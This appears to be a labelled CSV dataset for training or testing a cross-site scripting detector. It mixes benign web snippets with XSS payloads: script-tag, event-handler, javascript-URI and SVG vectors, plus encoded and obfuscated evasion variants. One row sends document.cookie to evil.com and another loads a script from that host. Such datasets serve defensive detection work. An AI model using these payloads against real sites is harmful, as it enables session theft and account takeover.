"payload","label","type","source"
"<object data=x onerror=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<script>(alert)(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<h1>Page Title</h1>","0","benign","normal_web_content"
"console.log('Application started');","0","benign","normal_web_content"
"<script>a=eval;b=alert;a(b)(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<input autofocus onfocus=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
""" onfocus=alert(1) autofocus x=""","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"SELECT name, email FROM customers LIMIT 10","0","benign","normal_web_content"
"<script>Reflect.apply(alert,null,[1])</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<span class='highlight'>Important text</span>","0","benign","normal_web_content"
"<SCRIPT>ALERT(1)</SCRIPT>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"Address: 123 Main Street, District 1, HCMC","0","benign","normal_web_content"
"setTimeout(() => { console.log('done'); }, 1000);","0","benign","normal_web_content"
"<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"This is a regular comment about the article.","0","benign","normal_web_content"
"<marquee onstart=alert(1)>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<svg onload=alert`1`>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"if (!email.includes('@')) { setError('Invalid email address'); }","0","benign","normal_web_content"
"<script>x=alert;x(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"Please fix the bug on the checkout page.","0","benign","normal_web_content"
"<ul class='list-unstyled'><li>Feature 1</li><li>Feature 2</li></ul>","0","benign","normal_web_content"
"<marquee loop=1 width=0 onfinish=alert(1)>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"?from=2024-01-01&to=2024-12-31","0","benign","normal_web_content"
"<input onfocus=alert(1) autofocus>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<SCRIPT>alert('XSS')</SCRIPT>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<select autofocus onfocus=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<scri	pt>alert(1)</scri	pt>","1","encoded","OWASP/GitHub/wafpass/payloadbox"
"<isindex autofocus onfocus=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<span class='highlight'>Important text</span>","0","benign","normal_web_content"
"<a onclick=alert(1) href=#>click</a>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<body onpageshow=alert(document.domain)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<a href='javascript:void(0)' onclick='alert(1)'>XSS</a>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"Thank you for your purchase!","0","benign","normal_web_content"
"h1, h2, h3 { color: #333; font-weight: bold; }","0","benign","normal_web_content"
"Progress: 75% complete","0","benign","normal_web_content"
"<button onclick=alert(1)>click me</button>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"const arr = [1, 2, 3, 4, 5];","0","benign","normal_web_content"
"fetch('/api/users').then(r => r.json()).then(data => console.log(data));","0","benign","normal_web_content"
"<img src=x onerror=alert('XSS')>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"?user=123&token=abc","0","benign","normal_web_content"
"<p>{{ user.name }}</p>","0","benign","normal_web_content"
"<script>alert.apply(null,[1])</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"javascript:void(alert(1))","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<pre><code>git commit -m 'initial commit'</code></pre>","0","benign","normal_web_content"
"<svg onload=eval(atob('YWxlcnQoMSk='))>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<meta charset='UTF-8'>","0","benign","normal_web_content"
"[Link text](https://example.com)","0","benign","normal_web_content"
"let result = arr.filter(x => x > 2);","0","benign","normal_web_content"
"<script>alert(location.href)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<video src='video.mp4' controls>","0","benign","normal_web_content"
"<svg onload=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<main id='content' role='main'>","0","benign","normal_web_content"
"const user = { id: 1, email: 'user@example.com' };","0","benign","normal_web_content"
"Array.from(document.querySelectorAll('.item'))","0","benign","normal_web_content"
"Can someone explain this concept more clearly?","0","benign","normal_web_content"
"<a href=javascript&colon;alert&lpar;1&rpar;>click","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<link rel='stylesheet' href='/styles/main.css'>","0","benign","normal_web_content"
"<summary onblur=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<script>fetch('https://evil.com?c='+btoa(document.cookie))</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"Can you help me with this issue?","0","benign","normal_web_content"
"<abbr title='HyperText Markup Language'>HTML</abbr>","0","benign","normal_web_content"
"<%= h @user.name %>","0","benign","normal_web_content"
"escapeHtml(text)","0","benign","normal_web_content"
"<body onpageshow=alert(1)>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<audio src='audio.mp3' controls>","0","benign","normal_web_content"
"{""username"": ""johndoe"", ""role"": ""admin""}","0","benign","normal_web_content"
"Error: File not found","0","benign","normal_web_content"
"<ul class='list-unstyled'><li>Feature 1</li><li>Feature 2</li></ul>","0","benign","normal_web_content"
"<details><summary>Click to expand</summary>Hidden content here</details>","0","benign","normal_web_content"
"<link rel=import href=data:text/html,<script>alert(1)</script>>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"<sCrIpT>alert(1)</ScRiPt>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"encodeURIComponent(userInput)","0","benign","normal_web_content"
"</title><script>alert(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<form action='/login' method='post'>","0","benign","normal_web_content"
"<label for='email'>Email Address:</label>","0","benign","normal_web_content"
"<table class='data-table'><thead><tr><th>Name</th></tr></thead></table>","0","benign","normal_web_content"
"sanitizeHtml(userInput, { allowedTags: [], allowedAttributes: {} })","0","benign","normal_web_content"
"<script src=data:text/javascript,alert(1)>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<input type=image src=x onerror=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"404 - Page Not Found","0","benign","normal_web_content"
"I've been using this product for 2 years now.","0","benign","normal_web_content"
"Math.random() * 100","0","benign","normal_web_content"
".container { max-width: 1200px; margin: 0 auto; }","0","benign","normal_web_content"
"<div onmouseover=alert(1)>hover me</div>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<span ondrag='alert(1)' draggable>drag me</span>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<math><mtext></table></math><script>alert(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<select onchange='alert(1)'><option>A</option><option>B</option></select>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"router.use('/api', rateLimit({ windowMs: 15*60*1000, max: 100 }));","0","benign","normal_web_content"
"<img/src=x onerror=alert(1)>","1","img_tag","OWASP/GitHub/wafpass/payloadbox"
"<div tabindex=0 onactivate=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<meta name='description' content='A website about web development'>","0","benign","normal_web_content"
"<script>location='javascript:alert(1)'</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"encodeURIComponent(userInput)","0","benign","normal_web_content"
"Great tutorial! Very helpful for beginners.","0","benign","normal_web_content"
"<script src='/js/app.js' defer></script>","0","benign","normal_web_content"
"<img src=x onerror=prompt('XSS')>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<input type='text' name='username' placeholder='Enter username'>","0","benign","normal_web_content"
"<body class='dark-mode'>","0","benign","normal_web_content"
"String(userInput).replace(/[<>""']/g, '')","0","benign","normal_web_content"
"<script>top['alert'](1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"window.addEventListener('load', function() { init(); });","0","benign","normal_web_content"
"console.error('Failed to load:', error.message);","0","benign","normal_web_content"
"<form><button formaction=javascript&colon;alert(1)>CLICKME","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<math href=javascript:alert(1)>CLICKME</math>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"<script>setTimeout('alert(1)',0)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<p class='text-muted small'>Last updated: January 2024</p>","0","benign","normal_web_content"
"Can you help me with this issue?","0","benign","normal_web_content"
"I've been using this product for 2 years now.","0","benign","normal_web_content"
"<body onhashchange=alert(1)><a href=#x>click</a>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"%3Cscript%3Ealert%281%29%3C%2Fscript%3E","1","encoded","OWASP/GitHub/wafpass/payloadbox"
"Rating: 4.5 out of 5 stars","0","benign","normal_web_content"
"<%= h @user.name %>","0","benign","normal_web_content"
"class User { constructor(name) { this.name = name; } }","0","benign","normal_web_content"
"<script>document.createElement(""img"").src=""x""+onerror+""=alert(1)""</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<div class='container' id='main' data-value='123'>","0","benign","normal_web_content"
"<svg/onload=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"Score: 95/100","0","benign","normal_web_content"
"<XSS STYLE=""xss:expression(alert('XSS'))"">","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"best restaurants in Saigon","0","benign","normal_web_content"
"<span onmouseup=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<script>alert.call(null,1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"@media (max-width: 768px) { .sidebar { display: none; } }","0","benign","normal_web_content"
"?search=laptop&category=electronics","0","benign","normal_web_content"
"<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<img src=""x"" onerror=""alert(1)"">","1","img_tag","OWASP/GitHub/wafpass/payloadbox"
"<script>document.write(unescape('%3Cscript%3Ealert(1)%3C/script%3E'))</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"' onfocus=alert(1) autofocus x='","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<meter min='0' max='100' value='75'>75 out of 100</meter>","0","benign","normal_web_content"
"Address: 123 Main Street, District 1, HCMC","0","benign","normal_web_content"
"<script>(1,alert)(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"window.addEventListener('load', function() { init(); });","0","benign","normal_web_content"
"class User { constructor(name) { this.name = name; } }","0","benign","normal_web_content"
"UPDATE users SET last_login = NOW() WHERE id = ?","0","benign","normal_web_content"
"<iframe src=javascript:alert(1)>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"<object type=text/html data=javascript:alert(1)>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"Nike shoes size 42","0","benign","normal_web_content"
"{""status"": ""success"", ""code"": 200}","0","benign","normal_web_content"
"<script>[][""filter""][""constructor""](""alert(1)"")();</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=javascript:alert(1)><circle r=400/></a>","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"Total: 1,234,567 records","0","benign","normal_web_content"
"'-alert(1)-'","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<script src=http://evil.com/xss.js></script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<th onmousemove='alert(1)'>header</th>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<figure onwheel=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<details ontoggle='alert(1)' open>details</details>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<script>alert('XSS')</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<script>Object.defineProperty(window,""__defineSetter__"",{value:function(){alert(1)}})</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"<html lang='en'>","0","benign","normal_web_content"
"validator.isEmail(email)","0","benign","normal_web_content"
"<script>alert(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"Array.from(document.querySelectorAll('.item'))","0","benign","normal_web_content"
"<td ondragend=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<scr<script>ipt>alert(1)</scr</script>ipt>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"Rating: 4.5 out of 5 stars","0","benign","normal_web_content"
"I disagree with point number 3 in this post.","0","benign","normal_web_content"
"<math><mi//xlink:href=javascript:alert(1)>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"""-alert(1)//","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"?id=45&action=view","0","benign","normal_web_content"
"<svg onload=""this[+](1)"">","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"<svg id=x><use href=#x onload=alert(1)/>","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"> This is a blockquote from the original author","0","benign","normal_web_content"
"<script>alert(/XSS/)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
